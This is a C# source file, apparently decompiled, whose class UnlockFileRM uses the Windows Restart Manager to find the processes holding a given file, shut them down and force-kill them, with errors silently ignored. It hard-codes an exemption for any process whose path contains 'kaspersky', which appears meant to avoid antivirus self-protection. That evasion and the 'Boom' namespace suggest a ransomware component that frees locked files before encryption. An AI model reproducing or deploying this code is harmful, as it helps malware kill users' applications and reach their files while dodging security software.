using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Boom;

public class UnlockFileRM
{
	private struct RM_UNIQUE_PROCESS
	{
		public int dwProcessId;

		public FileTime ProcessStartTime;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct RM_PROCESS_INFO
	{
		public RM_UNIQUE_PROCESS Process;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
		public string strAppName;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 64)]
		public string strServiceShortName;

		public RM_APP_TYPE ApplicationType;

		public uint AppStatus;

		public uint TSSessionId;

		[MarshalAs(UnmanagedType.Bool)]
		public bool bRestartable;
	}

	private enum RM_APP_TYPE
	{
		RmUnknownApp = 0,
		RmMainWindow = 1,
		RmOtherWindow = 2,
		RmService = 3,
		RmExplorer = 4,
		RmConsole = 5,
		RmCritical = 1000
	}

	private struct FileTime
	{
		public uint LowDateTime;

		public uint HighDateTime;

		public static FileTime FromDateTime(DateTime dateTime)
		{
			long num = dateTime.ToFileTime();
			FileTime result = default(FileTime);
			result.HighDateTime = (uint)(num >> 32);
			result.LowDateTime = (uint)((ulong)num & 0xFFFFFFFFuL);
			return result;
		}
	}

	private const int RmRebootReasonNone = 0;

	private const int CCH_RM_MAX_APP_NAME = 255;

	private const int CCH_RM_MAX_SVC_NAME = 63;

	private static string[] gl_RMBlacklisted = new string[1] { "kaspersky" };

	[DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode)]
	private static extern int RmStartSession(out uint pSessionHandle, int dwSessionFlags, string strSessionKey);

	[DllImport("rstrtmgr.dll")]
	private static extern int RmEndSession(uint pSessionHandle);

	[DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode)]
	private static extern int RmRegisterResources(uint pSessionHandle, uint nFiles, string[] rgsFilenames, uint nApplications, [In] RM_UNIQUE_PROCESS[] rgApplications, uint nServices, string[] rgsServiceNames);

	[DllImport("rstrtmgr.dll")]
	private static extern int RmGetList(uint dwSessionHandle, out uint pnProcInfoNeeded, ref uint pnProcInfo, [In][Out] RM_PROCESS_INFO[] rgAffectedApps, ref uint lpdwRebootReasons);

	[DllImport("rstrtmgr")]
	private static extern int RmShutdown(uint pSessionHandle, uint actionFlags, IntPtr statusCallback);

	[DllImport("Kernel32.dll")]
	private static extern bool QueryFullProcessImageName([In] IntPtr hProcess, [In] uint dwFlags, [Out] StringBuilder lpExeName, [In][Out] ref uint lpdwSize);

	private static string GetMainModuleFileName(Process process)
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		uint lpdwSize = (uint)(stringBuilder.Capacity + 1);
		return QueryFullProcessImageName(process.Handle, 0u, stringBuilder, ref lpdwSize) ? stringBuilder.ToString() : "";
	}

	private static bool IsBlacklistedProcess(Process proc)
	{
		string[] array = gl_RMBlacklisted;
		if (array.Length == 0)
		{
			return false;
		}
		string mainModuleFileName = GetMainModuleFileName(proc);
		if (mainModuleFileName.Length == 0)
		{
			return false;
		}
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				if (mainModuleFileName.ToLower().Contains(array[num].ToLower()))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	public static void ShutdownProcesses(string[] pathStrings)
	{
		List<Process> list = new List<Process>();
		if (RmStartSession(out var pSessionHandle, 0, Guid.NewGuid().ToString("N")) != 0)
		{
			return;
		}
		try
		{
			if (RmRegisterResources(pSessionHandle, (uint)pathStrings.Length, pathStrings, 0u, null, 0u, null) != 0)
			{
				return;
			}
			uint pnProcInfoNeeded = 0u;
			uint pnProcInfo = 0u;
			uint lpdwRebootReasons = 0u;
			switch (RmGetList(pSessionHandle, out pnProcInfoNeeded, ref pnProcInfo, null, ref lpdwRebootReasons))
			{
			case 234:
			{
				RM_PROCESS_INFO[] array = new RM_PROCESS_INFO[pnProcInfoNeeded];
				pnProcInfo = (uint)array.Length;
				if (RmGetList(pSessionHandle, out pnProcInfoNeeded, ref pnProcInfo, array, ref lpdwRebootReasons) != 0)
				{
					return;
				}
				int id = Process.GetCurrentProcess().Id;
				for (int i = 0; i < pnProcInfo; i++)
				{
					if (array[i].Process.dwProcessId == id)
					{
						continue;
					}
					try
					{
						Process processById = Process.GetProcessById(array[i].Process.dwProcessId);
						if (!IsBlacklistedProcess(processById))
						{
							list.Add(processById);
						}
					}
					catch
					{
					}
				}
				break;
			}
			default:
				return;
			case 0:
				break;
			}
			if (list.Count == 0)
			{
				return;
			}
			RM_UNIQUE_PROCESS[] array2 = new RM_UNIQUE_PROCESS[list.Count];
			for (int i = 0; i < list.Count; i++)
			{
				array2[i].dwProcessId = list[i].Id;
				array2[i].ProcessStartTime = FileTime.FromDateTime(list[i].StartTime);
			}
			if (RmRegisterResources(pSessionHandle, 0u, new string[0], (uint)list.Count, array2, 0u, new string[0]) != 0 || RmShutdown(pSessionHandle, 1u, IntPtr.Zero) == 0)
			{
				return;
			}
			foreach (Process item in list)
			{
				try
				{
					item.Kill();
				}
				catch
				{
				}
			}
		}
		finally
		{
			RmEndSession(pSessionHandle);
		}
	}

	public static void RMEntry(string filePath)
	{
		try
		{
			ShutdownProcesses(new string[1] { filePath });
		}
		catch
		{
		}
	}
}
